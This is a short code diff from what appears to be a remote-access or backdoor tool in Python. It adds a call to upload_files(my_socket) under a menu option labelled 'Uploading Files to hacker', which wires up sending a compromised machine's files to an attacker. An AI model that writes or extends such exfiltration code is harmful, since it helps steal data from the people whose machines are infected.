@@ -17,6 +17,7 @@ def handleConnection(my_socket):
 
         elif user_option == "3":
             print("\t\t[+] Uploading Files to hacker")
+            upload_files(my_socket)
         elif user_option == "4":
             print("\t\t[+] Uploading Folders to hacker")
         elif user_option == "5":
